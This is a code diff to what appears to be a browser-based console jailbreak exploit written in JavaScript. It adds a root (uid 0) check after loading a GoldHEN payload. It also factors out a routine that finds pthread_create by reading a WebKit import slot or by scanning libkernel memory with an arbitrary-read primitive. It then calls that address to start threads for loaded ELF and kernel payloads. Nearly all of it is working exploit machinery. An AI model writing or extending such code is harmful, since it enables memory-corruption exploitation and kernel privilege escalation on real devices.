@@ -1514,6 +1514,15 @@ async function attempt(ctx, opts) {
   }
 
   if (henOk) {
+    const uid = sc(S.getuid).i32;
+    say("[p] post-goldhen uid=" + uid + " (0 = payload a tourne)");
+    if (uid !== 0) {
+      say("[p] goldhen.bin n'a pas pris effet -- on ne lance pas kernel_1402.bin");
+      henOk = false;
+    }
+  }
+
+  if (henOk) {
     say("[p] Attempting to load kernel_1402.bin (kernel payload, 14.02)");
     try {
       iface.kpayload = await loadPayload("kernel_1402.bin");
@@ -1575,6 +1584,38 @@ function elfInfo(blob) {
   return { entry: entry, segs: segs };
 }
 
+/* resolve pthread_create: use the slot if it points into libkernel, else scan */
+function findPthreadCreate(c) {
+  const SLOT = 0x3cb9c00;
+  const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
+    ? c.off.wk___imp_pthread_create : SLOT;
+  const check = function (fn) {
+    if (!c.libkernelBase) return false;
+    const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
+    return (fn.hi >>> 0) === (c.libkernelBase.hi >>> 0) && d > 0 && d <= 0x400000;
+  };
+
+  if (c.webkitBase) {
+    const raw = c.p.read8(c.webkitBase.add32(slot));
+    const fn = v(raw.low, raw.hi);
+    say("[p] pthread slot +0x" + slot.toString(16) + " = " + text(fn));
+    if (check(fn)) return fn;
+  }
+
+  if (!c.libkernelBase) return null;
+  say("[p] slot invalid -- scanning libkernel for pthread_create");
+  for (let o = 0; o < 0x400000; o += 4) {
+    const q = c.p.read8(c.libkernelBase.add32(o));
+    const fn = v(q.low, q.hi);
+    if (!check(fn)) continue;
+    const d = (fn.low - (c.libkernelBase.low >>> 0)) >>> 0;
+    if (d === 0 || d > 0x400000) continue;
+    say("[p] candidate pthread_create at libkernel +0x" + d.toString(16) + " = " + text(fn));
+    return fn;
+  }
+  return null;
+}
+
 async function loadElf(url, blob) {
   const c = host();
   const info = elfInfo(blob);
@@ -1616,27 +1657,14 @@ async function loadElf(url, blob) {
   const entry = plus(got, info.entry - base);
   say("[p] entry at " + text(entry) + " -- starting thread");
 
-  const SLOT_1352 = 0x3cb9c00;
-  const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
-    ? c.off.wk___imp_pthread_create : SLOT_1352;
-  if (!c.webkitBase || !c.libkernelBase) {
-    say("[p] no module bases -- ELF sits loaded at " + text(got) + ", not started");
-    return false;
-  }
-  const fnr = c.p.read8(c.webkitBase.add32(slot));
-  const fn = v(fnr.low, fnr.hi);
-  const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
-  if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
-    say("[p] pthread_create slot holds " + text(fn) + ", not in libkernel -- not calling it");
-    return false;
-  }
+  const fn = findPthreadCreate(c);
+  if (!fn) { say("[p] no pthread_create -- ELF sits loaded at " + text(got) + ", not started"); return false; }
 
   const thr = alloc(8); thr.u8.fill(0);
   const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
   const handle = qAt(thr, 0);
-  const started = rc === 0 && (handle.hi >>> 0) > 0;
-  say("[p] " + blob.length + " bytes ELF, thread rc=" + rc + (started ? " -- running" : " -- did NOT start"));
-  return started;
+  say("[p] pthread_create rc=" + rc + " handle=" + text(handle) + " entry=" + text(entry));
+  return rc === 0;
 }
 
 async function loadPayload(url) {
@@ -1699,31 +1727,16 @@ async function loadPayload(url) {
   say("[p] kpayload entry call NOP'd (0x1136) -- loader-only run");
   say("[p] payload copied and verified, starting thread");
 
-  const SLOT_1352 = 0x3cb9c00;
-  const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
-    ? c.off.wk___imp_pthread_create : SLOT_1352;
-  if (!c.webkitBase || !c.libkernelBase) {
-    say("[p] no module bases -- payload sits loaded at " + text(entry) + ", not started");
-    return false;
-  }
-  const fnr = c.p.read8(c.webkitBase.add32(slot));
-  const fn = v(fnr.low, fnr.hi);
-  const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
-  if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
-    say("[p] slot +0x" + slot.toString(16) + " holds " + text(fn)
-        + ", not inside libkernel " + text(c.libkernelBase) + " -- not calling it");
-    return false;
-  }
-  say("[p] pthread_create at " + text(fn) + " = libkernel +0x" + d.toString(16));
+  const fn = findPthreadCreate(c);
+  if (!fn) { say("[p] no pthread_create -- payload sits loaded at " + text(entry) + ", not started"); return false; }
 
   const thr = alloc(8);
   thr.u8.fill(0);
   const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
   const handle = qAt(thr, 0);
-  const started = rc === 0 && (handle.hi >>> 0) > 0;
-  say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc
-      + (started ? " -- running" : " -- did NOT start"));
-  return started;
+  say("[p] pthread_create rc=" + rc + " handle=" + text(handle) + " entry=" + text(entry)
+      + " len=" + blob.length);
+  return rc === 0;
 }
 
 /* End of file */
